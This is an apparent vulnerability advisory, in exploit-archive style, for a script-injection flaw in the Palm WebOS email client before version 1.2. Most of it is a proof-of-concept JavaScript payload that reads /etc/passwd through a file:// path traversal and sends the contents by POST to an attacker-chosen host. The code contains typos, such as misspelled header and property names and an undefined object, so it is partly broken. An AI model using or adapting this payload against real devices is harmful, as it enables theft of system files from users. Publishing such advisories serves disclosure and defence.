source: https://www.securityfocus.com/bid/36592/info

Palm WebOS is prone to an arbitrary-script-injection vulnerability because the integrated email application fails to properly sanitize user-supplied input.

An attacker can exploit this issue to execute arbitrary script code. Successful exploits can compromise the application.

Versions prior to WebOS 1.2 are vulnerable.

<script>
var getdata = null;
get = new XMLHttpRequest();

get.open(&#039;GET&#039;, "file://../../../../../../../../../etc/passwd");
get.send("");
get.onreadystatechange = function() {
    if (get.readyState == 4) {
	getdata = get.responseText;
	POST(getdata);
    }
}

function POST (egg) {
    post = new XMLHttpRequest();
    var strResult;
    //Edit WEBSITE_OF_CHOICE for Grabber
    post.open(&#039;POST&#039;, "WEBSITE_OF_CHOICE",false);
    post.setRequestHeader(&#039;Conetnt-Type&#039;,&#039;application/x-www-form-urlencoded&#039;);
    post.send(egg);
    get.send("");
    post = null;
    strResult = objHTTP.tesponseTetxt;
}
</script>